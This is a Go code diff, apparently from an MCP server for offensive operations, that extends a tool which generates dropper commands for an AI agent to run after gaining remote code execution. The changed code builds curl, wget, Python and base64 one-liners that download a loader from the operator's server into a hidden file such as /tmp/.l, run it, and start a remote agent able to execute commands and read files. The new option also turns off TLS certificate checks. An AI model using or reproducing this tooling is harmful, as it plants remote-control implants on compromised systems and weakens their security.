@@ -123,11 +123,16 @@ func (s *Server) registerAgentTools() {
 			"  Windows url:  curl_cmd (curl.exe is built-in since Win10 1803)\n"+
 			"  Windows inline: b64_cmd (pure PowerShell, no external tools needed)\n"+
 			"If a command fails with 'command not found' / 'not recognized', move to the next fallback immediately.\n\n"+
+			"Loader flags (set via insecure parameter or added manually to the command):\n"+
+			"  -k  Skip TLS certificate verification. Use ONLY when the target lacks a CA bundle (e.g. minimal containers).\n"+
+			"      The flag is propagated to the Stage 2 agent so its WebSocket also skips verification.\n"+
+			"  -f  Stay in foreground (do not daemonize). Useful for debugging — errors are printed to stderr.\n\n"+
 			"Workflow after achieving RCE:\n"+
 			"  1. Probe target OS/arch: uname -m (Linux) or $ENV:PROCESSOR_ARCHITECTURE (Windows).\n"+
 			"  2. Call agent_dropper_generate with agent_id, os_arch, ttl, and delivery mode.\n"+
 			"  3. Try each command in the fallback chain until one succeeds (the command returns immediately).\n"+
 			"  4. Wait a few seconds, then call agent_list to confirm the agent appears as 'online'.\n"+
+			"     If the agent does not appear, retry with -f added to the loader command to see errors.\n"+
 			"  5. Use agent_task_schedule to run capabilities (exec, read_file, fetch_url, system_info).\n\n"+
 			"Available targets: %s", targetList)
 
@@ -141,6 +146,10 @@ func (s *Server) registerAgentTools() {
 			mcpgo.Description("Token lifetime in Go duration format, e.g. '2h', '24h', '168h'")),
 		mcpgo.WithString("delivery",
 			mcpgo.Description("Delivery mode: 'url' (default) returns curl/wget commands; 'inline' embeds the loader as base64 for air-gapped targets")),
+		mcpgo.WithBoolean("insecure",
+			mcpgo.Description("Skip TLS certificate verification (loader -k flag). "+
+				"Use ONLY when the target has no CA bundle (e.g. minimal containers). "+
+				"The flag is propagated to the agent so its WebSocket connection also skips verification.")),
 	)
 	s.mcp.AddTool(dropperTool, s.handleAgentDropperGenerate)
 }
@@ -524,6 +533,10 @@ func (s *Server) handleAgentDropperGenerate(ctx context.Context, req mcpgo.CallT
 	osArch := req.GetString("os_arch", "")
 	ttlStr := req.GetString("ttl", "")
 	delivery := req.GetString("delivery", "url")
+	var insecureTLS bool
+	if args := req.GetArguments(); args != nil {
+		insecureTLS, _ = args["insecure"].(bool)
+	}
 
 	ttl, errMsg := parseDropperParams(agentID, osArch, ttlStr, delivery)
 	if errMsg != "" {
@@ -548,9 +561,13 @@ func (s *Server) handleAgentDropperGenerate(ctx context.Context, req mcpgo.CallT
 	expiresAt := time.Now().Add(ttl).UTC()
 	loaderB64 := base64.StdEncoding.EncodeToString(loaderBytes)
 	downloadURL := s.agentBaseURL + "/dl/" + loaderName
-	launchArgs := fmt.Sprintf("%s %s %s", s.agentBaseURL, token, agentID)
+	loaderFlags := ""
+	if insecureTLS {
+		loaderFlags = "-k "
+	}
+	launchArgs := fmt.Sprintf("%s%s %s %s", loaderFlags, s.agentBaseURL, token, agentID)
 
-	cmds := buildDropperCmds(osArch, downloadURL, loaderB64, launchArgs)
+	cmds := buildDropperCmds(osArch, downloadURL, loaderB64, launchArgs, insecureTLS)
 
 	ev := s.newAuditEvent(ctx, "agent.dropper.generate", "ok")
 	ev.Resource = agentID
@@ -639,27 +656,47 @@ type dropperCmds struct {
 	python3B64Cmd string
 }
 
-func buildDropperCmds(osArch, downloadURL, loaderB64, launchArgs string) dropperCmds {
+func buildDropperCmds(osArch, downloadURL, loaderB64, launchArgs string, insecure bool) dropperCmds {
+	// When insecure, add -k to curl and --no-check-certificate to wget so the
+	// download tools also skip TLS verification (the loader -k flag only
+	// affects Stage 2 download, not the Stage 1 fetch by curl/wget).
+	curlFlag := "-fsSL"
+	wgetFlag := "-qO"
+	py3TLS := ""
+	if insecure {
+		curlFlag = "-fskSL"
+		wgetFlag = "--no-check-certificate -qO"
+		py3TLS = "import ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; "
+	}
+
 	if strings.HasPrefix(osArch, "windows-") {
 		return dropperCmds{
 			curlCmd: fmt.Sprintf(
-				`curl.exe -fsSL "%s" -o "$env:TEMP\l.exe" && & "$env:TEMP\l.exe" %s`,
-				downloadURL, launchArgs),
+				`curl.exe %s "%s" -o "$env:TEMP\l.exe" && & "$env:TEMP\l.exe" %s`,
+				curlFlag, downloadURL, launchArgs),
 			b64Cmd: fmt.Sprintf(
 				`[IO.File]::WriteAllBytes("$env:TEMP\l.exe",[Convert]::FromBase64String("%s")); & "$env:TEMP\l.exe" %s`,
 				loaderB64, launchArgs),
 		}
 	}
+
+	py3URLCmd := fmt.Sprintf(
+		`python3 -c "%simport urllib.request,os; urllib.request.urlretrieve('%s','/tmp/.l'); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
+		py3TLS, downloadURL, launchArgs)
+	if insecure {
+		py3URLCmd = fmt.Sprintf(
+			`python3 -c "%simport urllib.request,os; opener=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx)); opener.retrieve('%s','/tmp/.l'); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
+			py3TLS, downloadURL, launchArgs)
+	}
+
 	return dropperCmds{
 		curlCmd: fmt.Sprintf(
-			`curl -fsSL '%s' -o /tmp/.l && chmod +x /tmp/.l && /tmp/.l %s`,
-			downloadURL, launchArgs),
+			`curl %s '%s' -o /tmp/.l && chmod +x /tmp/.l && /tmp/.l %s`,
+			curlFlag, downloadURL, launchArgs),
 		wgetCmd: fmt.Sprintf(
-			`wget -qO /tmp/.l '%s' && chmod +x /tmp/.l && /tmp/.l %s`,
-			downloadURL, launchArgs),
-		python3Cmd: fmt.Sprintf(
-			`python3 -c "import urllib.request,os; urllib.request.urlretrieve('%s','/tmp/.l'); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
-			downloadURL, launchArgs),
+			`wget %s /tmp/.l '%s' && chmod +x /tmp/.l && /tmp/.l %s`,
+			wgetFlag, downloadURL, launchArgs),
+		python3Cmd: py3URLCmd,
 		b64Cmd: fmt.Sprintf(
 			`printf '%s' | base64 -d > /tmp/.l && chmod +x /tmp/.l && /tmp/.l %s`,
 			loaderB64, launchArgs),
